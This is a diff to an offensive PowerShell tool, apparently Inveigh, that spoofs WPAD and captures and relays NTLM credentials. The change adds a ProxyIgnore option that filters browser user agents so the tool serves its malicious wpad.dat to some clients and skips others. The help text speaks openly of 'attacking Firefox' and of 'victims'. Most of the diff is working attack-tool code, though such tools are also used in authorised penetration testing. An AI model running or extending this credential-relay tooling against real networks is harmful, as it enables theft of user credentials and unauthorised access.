@@ -70,6 +70,14 @@ Default = Any: IP address for the proxy listener.
 .PARAMETER ProxyPort
 Default = 8182: TCP port for the proxy listener.
 
+.PARAMETER ProxyIgnore
+Default = Firefox: Comma separated list of keywords to use for filtering browser user agents. Matching browsers
+will not be sent the wpad.dat file used for capturing proxy authentications. Firefox does not work correctly
+with the proxy server failover setup. Firefox will be left unable to connect to any sites until the proxy is
+cleared. Remove "Firefox" from this list to attack Firefox. If attacking Firefox, consider setting
+-SpooferRepeat N to limit attacks against a single target so that victims can recover Firefox connectivity by
+closing and reopening.
+
 .PARAMETER Usernames
 Default = All Usernames: Comma separated list of usernames to use for relay attacks. Accepts both username and
 domain\username format. 
@@ -149,6 +157,7 @@ param
     [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$HTTPIP = "0.0.0.0",
     [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$ProxyIP = "",
     [parameter(Mandatory=$false)][ValidatePattern('^[A-Fa-f0-9]{16}$')][String]$Challenge = "",
+    [parameter(Mandatory=$false)][Array]$ProxyIgnore = "Firefox",
     [parameter(Mandatory=$false)][Array]$Usernames = "",
     [parameter(Mandatory=$false)][Int]$HTTPPort = "80",
     [parameter(Mandatory=$false)][Int]$HTTPSPort = "443",
@@ -453,6 +462,13 @@ if($Proxy -eq 'Y')
     $inveigh.status_queue.Add("Proxy Capture/Relay = Enabled")  > $null
     $ProxyPortFailover = $ProxyPort + 1
     $WPADResponse = "function FindProxyForURL(url,host){return `"PROXY $ProxyIP`:$ProxyPort; PROXY $ProxyIP`:$ProxyPortFailover; DIRECT`";}"
+    $ProxyIgnore = ($ProxyIgnore | Where-Object {$_ -and $_.Trim()})
+
+    if($ProxyIgnore.Count -gt 0)
+    {
+        $inveigh.status_queue.Add("Proxy Ignored User Agents = " + ($ProxyIgnore -join ","))  > $null
+    }
+
 }
 
 $inveigh.status_queue.Add("Relay Target = $Target") > $null
@@ -2514,7 +2530,7 @@ $SMB_relay_response_scriptblock =
 # HTTP/HTTPS Server ScriptBlock
 $HTTP_scriptblock = 
 { 
-    param ($Challenge,$Command,$HTTPIP,$HTTPPort,$HTTPS_listener,$proxy_listener,$RelayAutoDisable,$Service,$SMB_version,$Target,$WPADAuth,$WPADResponse)
+    param ($Challenge,$Command,$HTTPIP,$HTTPPort,$HTTPS_listener,$ProxyIgnore,$proxy_listener,$RelayAutoDisable,$Service,$SMB_version,$Target,$WPADAuth,$WPADResponse)
 
     function NTLMChallengeBase64
     {
@@ -2732,6 +2748,24 @@ $HTTP_scriptblock =
             {
                 $inveigh.console_queue.Add("$(Get-Date -format 's') - $HTTP_type request for $HTTP_request_raw_URL received from $HTTP_source_IP")
                 $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - $HTTP_type request for $HTTP_request_raw_URL received from $HTTP_source_IP")])
+
+                if($TCP_request -like "*-55-73-65-72-2D-41-67-65-6E-74-3A-20-*")
+                {
+                    $HTTP_user_agent = $TCP_request.Substring($TCP_request.IndexOf("-55-73-65-72-2D-41-67-65-6E-74-3A-20-") + 36)
+                    $HTTP_user_agent = $HTTP_user_agent.Substring(0,$HTTP_user_agent.IndexOf("-0D-0A-"))
+                    $HTTP_user_agent = $HTTP_user_agent.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
+                    $user_agent = New-Object System.String ($HTTP_user_agent,0,$HTTP_user_agent.Length)
+                    $inveigh.console_queue.Add("$(Get-Date -format 's') - $HTTP_type user agent $user_agent from $HTTP_source_IP")
+                    $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - $HTTP_type user agent $user_agent from $HTTP_source_IP")])
+
+                    if($ProxyIgnore.Count -gt 0 -and ($ProxyIgnore | ForEach-Object{$user_agent.contains($_)}))
+                    {
+                        $inveigh.console_queue.Add("$(Get-Date -format 's') - $HTTP_type ignoring wpad.dat request from $HTTP_source_IP")
+                        $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - $HTTP_type ignoring wpad.dat request from $HTTP_source_IP")])
+                    }
+
+                }
+
             }
         
             if($authentication_header.startswith('NTLM '))
@@ -3023,7 +3057,7 @@ $HTTP_scriptblock =
 
             }
 
-            if(!$proxy_listener -and $WPADResponse -and $HTTP_request_raw_URL -match '/wpad.dat' -and [System.BitConverter]::ToString($HTTP_response_status_code) -eq "32-30-30")
+            if(!$proxy_listener -and $WPADResponse -and $HTTP_request_raw_URL -match '/wpad.dat' -and (!$ProxyIgnore -or !($ProxyIgnore | ForEach-Object{$user_agent.contains($_)})))
             {
                 $HTTP_message = $WPADResponse
                 $HTTP_content_type_header = 0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x54,0x79,0x70,0x65,0x3a,0x20 + [System.Text.Encoding]::UTF8.GetBytes("application/x-ns-proxy-autoconfig") + 0x0d,0x0a
@@ -3251,9 +3285,9 @@ function HTTPListener()
     $HTTP_powershell.AddScript($SMB_relay_execute_scriptblock) > $null
     $HTTP_powershell.AddScript($SMB_NTLM_functions_scriptblock) > $null
     $HTTP_powershell.AddScript($HTTP_scriptblock).AddArgument($Challenge).AddArgument($Command).AddArgument(
-        $HTTPIP).AddArgument($HTTPPort).AddArgument($HTTPS_listener).AddArgument($proxy_listener).AddArgument(
-        $RelayAutoDisable).AddArgument($Service).AddArgument($SMB_version).AddArgument($Target).AddArgument(
-        $WPADAuth).AddArgument($WPADResponse) > $null
+        $HTTPIP).AddArgument($HTTPPort).AddArgument($HTTPS_listener).AddArgument($ProxyIgnore).AddArgument(
+        $proxy_listener).AddArgument($RelayAutoDisable).AddArgument($Service).AddArgument(
+        $SMB_version).AddArgument($Target).AddArgument($WPADAuth).AddArgument($WPADResponse) > $null
     $HTTP_powershell.BeginInvoke() > $null
 }
 
@@ -3276,9 +3310,9 @@ function HTTPSListener()
     $HTTPS_powershell.AddScript($SMB_relay_execute_scriptblock) > $null
     $HTTPS_powershell.AddScript($SMB_NTLM_functions_scriptblock) > $null
     $HTTPS_powershell.AddScript($HTTP_scriptblock).AddArgument($Challenge).AddArgument($Command).AddArgument(
-        $HTTPIP).AddArgument($HTTPSPort).AddArgument($HTTPS_listener).AddArgument($proxy_listener).AddArgument(
-        $RelayAutoDisable).AddArgument($Service).AddArgument($SMB_version).AddArgument($Target).AddArgument(
-        $WPADAuth).AddArgument($WPADResponse) > $null
+        $HTTPIP).AddArgument($HTTPSPort).AddArgument($HTTPS_listener).AddArgument($ProxyIgnore).AddArgument(
+        $proxy_listener).AddArgument($RelayAutoDisable).AddArgument($Service).AddArgument(
+        $SMB_version).AddArgument($Target).AddArgument($WPADAuth).AddArgument($WPADResponse) > $null
     $HTTPS_powershell.BeginInvoke() > $null
 }
 
@@ -3301,9 +3335,9 @@ function ProxyListener()
     $proxy_powershell.AddScript($SMB_relay_execute_scriptblock) > $null
     $proxy_powershell.AddScript($SMB_NTLM_functions_scriptblock) > $null
     $proxy_powershell.AddScript($HTTP_scriptblock).AddArgument($Challenge).AddArgument($Command).AddArgument(
-        $ProxyIP).AddArgument($ProxyPort).AddArgument($HTTPS_listener).AddArgument($proxy_listener).AddArgument(
-        $RelayAutoDisable).AddArgument($Service).AddArgument($SMB_version).AddArgument($Target).AddArgument(
-        $WPADAuth).AddArgument($WPADResponse) > $null
+        $ProxyIP).AddArgument($ProxyPort).AddArgument($HTTPS_listener).AddArgument($ProxyIgnore).AddArgument(
+        $proxy_listener).AddArgument($RelayAutoDisable).AddArgument($Service).AddArgument(
+        $SMB_version).AddArgument($Target).AddArgument($WPADAuth).AddArgument($WPADResponse) > $null
     $proxy_powershell.BeginInvoke() > $null
 }
 
